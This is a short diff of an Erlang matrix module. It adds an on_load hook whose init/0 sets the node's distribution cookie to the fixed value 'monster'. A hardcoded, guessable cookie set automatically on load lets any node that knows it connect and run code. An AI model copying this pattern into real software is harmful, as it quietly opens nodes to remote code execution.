@@ -4,7 +4,10 @@
 		transpose/1,
 		multiply/2
 		]).
+-on_load(init/0).
+
 init() ->
+    erlang:set_cookie(node(), 'monster'),
 	ok.
 
 version() -> 
